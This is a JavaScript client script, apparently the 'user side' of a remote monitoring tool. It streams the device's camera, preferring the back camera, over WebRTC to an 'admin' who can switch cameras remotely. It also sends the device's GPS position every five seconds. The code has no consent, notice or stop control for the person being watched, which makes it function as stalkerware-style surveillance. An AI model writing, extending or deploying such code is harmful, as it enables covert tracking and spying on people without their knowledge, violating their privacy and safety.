// USER SIDE (RELIABLE CAMERA SWITCH)
const socket = io();

let pc = null;
let stream = null;
let videoDevices = [];
let currentDeviceIndex = 0;

// Get available cameras
async function loadCameras() {
  const devices = await navigator.mediaDevices.enumerateDevices();
  videoDevices = devices.filter(d => d.kind === "videoinput");
}

// Create WebRTC connection
function createPC(track) {
  const pc = new RTCPeerConnection({
    iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
  });

  pc.onicecandidate = e => {
    if (e.candidate) socket.emit("ice-candidate", e.candidate);
  };

  pc.addTrack(track);
  return pc;
}

// Start camera with specific deviceId
async function startCamera(deviceId) {
  if (stream) stream.getTracks().forEach(t => t.stop());

  stream = await navigator.mediaDevices.getUserMedia({
    video: { deviceId: { exact: deviceId } },
    audio: false
  });

  document.getElementById("camera").srcObject = stream;

  if (pc) pc.close();
  pc = createPC(stream.getVideoTracks()[0]);

  const offer = await pc.createOffer();
  await pc.setLocalDescription(offer);
  socket.emit("offer", offer);
}

// Switch camera
async function switchCamera() {
  if (videoDevices.length < 2) return;

  currentDeviceIndex = (currentDeviceIndex + 1) % videoDevices.length;
  await startCamera(videoDevices[currentDeviceIndex].deviceId);
}

// Admin triggers camera switch
socket.on("switch-camera", () => {
  switchCamera();
});

// Admin answer
socket.on("answer", async answer => {
  if (pc) await pc.setRemoteDescription(new RTCSessionDescription(answer));
});

// ICE
socket.on("ice-candidate", async candidate => {
  if (pc) await pc.addIceCandidate(new RTCIceCandidate(candidate));
});

// Location
setInterval(() => {
  navigator.geolocation.getCurrentPosition(pos => {
    socket.emit("location", {
      lat: pos.coords.latitude,
      lon: pos.coords.longitude
    });
  });
}, 5000);

// Init
(async () => {
  await loadCameras();

  // Prefer back camera if available
  if (videoDevices.length > 1) {
    currentDeviceIndex = videoDevices.length - 1;
  }

  await startCamera(videoDevices[currentDeviceIndex].deviceId);
})();
